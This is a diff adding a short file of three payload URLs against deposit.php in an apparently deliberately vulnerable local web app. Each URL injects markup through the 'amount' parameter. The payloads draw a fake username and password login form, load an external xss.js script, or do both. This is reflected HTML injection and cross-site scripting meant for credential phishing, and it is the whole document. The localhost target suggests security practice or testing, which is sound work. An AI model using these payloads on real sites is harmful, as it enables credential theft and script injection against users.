@@ -1,0 +1,5 @@
+localhost:8000/vulnerable_web_app/current_build/deposit.php?amount=<div class="error"><h3>Please login to proceed</h3> <form>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br></div>
+
+localhost:8000/vulnerable_web_app/current_build/deposit.php?amount=<div class="error"><h3>Please login to proceed</h3> <form>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br></div><script src="http://localhost:8000/vulnerable_web_app/current_build/xss.js"/>
+
+localhost:8000/vulnerable_web_app/current_build/deposit.php?amount=<script src="http://localhost:8000/vulnerable_web_app/current_build/xss.js"/>
